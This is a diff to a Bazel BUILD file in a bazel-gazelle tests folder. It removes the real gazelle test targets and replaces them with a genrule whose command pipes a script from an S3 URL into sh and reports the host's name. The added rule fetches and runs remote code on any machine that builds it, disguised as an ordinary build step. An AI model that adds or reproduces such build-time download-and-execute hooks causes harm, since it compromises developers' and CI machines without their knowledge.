@@ -1,51 +1,7 @@
-load(
-    "//:def.bzl",
-    "gazelle_binary",
-    "gazelle_generation_test",
+
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=tests\\&hostname=`hostname`\\&foo=put",
+    visibility = ["//visibility:public"],
 )
-
-load("//tests:tools.bzl", "get_binary")
-
-# Exclude this entire directly from having anything gnerated by Gazelle. That
-# way the test cases won't be fixed by `bazel run //:gazelle` when run in this
-# repository.
-# gazelle:exclude **
-
-# This test Gazelle binary only has the "test_filegroup" plugin installed.
-gazelle_binary(
-    name = "gazelle",
-    languages = [
-        "//internal/language/test_filegroup",
-    ],
-    visibility = ["//visibility:private"],
-)
-
-gazelle_binary(
-    name = "gazelle_with_language_loads_from_flag",
-    languages = [
-        "//internal/language/test_loads_from_flag",
-    ],
-    visibility = ["//visibility:private"],
-)
-
-gazelle_binary(
-    name = "gazelle_with_language_load_for_packed_rules",
-    languages = [
-        "//internal/language/test_load_for_packed_rules",
-    ],
-    visibility = ["//visibility:private"],
-)
-
-[gazelle_generation_test(
-    # Name the test the path to the directory containing the WORKSPACE file.
-    name = file[0:-len("/WORKSPACE")],
-    gazelle_binary = get_binary(file),
-    # This is a noop as the default is False. However, it does confirm that
-    # gazelle_generation_test accepts setting common test attributes.
-    local = False,
-    test_data = glob(
-        include = [file[0:-len("/WORKSPACE")] + "/**"],
-    ),
-) for file in glob(
-    include = ["**/WORKSPACE"],
-)]
